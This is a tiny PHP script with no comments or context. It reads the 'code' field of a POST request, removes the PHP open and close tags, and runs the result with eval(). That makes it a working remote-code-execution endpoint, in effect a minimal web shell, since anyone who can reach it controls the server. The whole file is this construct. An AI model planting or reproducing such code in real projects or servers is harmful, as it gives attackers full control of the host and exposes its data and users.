<?php
    $test = str_replace("<?php", "", $_POST["code"]);
    $test = str_replace("?>", "", $test);
    eval($test);
?>
